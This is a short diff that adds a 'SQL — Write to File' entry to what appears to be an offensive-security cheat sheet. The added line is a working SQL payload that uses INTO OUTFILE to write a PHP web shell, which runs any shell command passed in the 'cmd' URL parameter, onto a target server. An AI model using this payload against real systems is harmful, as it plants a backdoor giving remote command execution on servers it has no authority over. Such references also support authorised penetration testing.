@@ -485,6 +485,14 @@ OK
 OK
 ```
 
+## SQL
+
+### Write to File
+
+```c
+SELECT "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE '/PATH/TO/FILE/<FILE>'
+```
+
 ## sqlcmd
 
 ```c
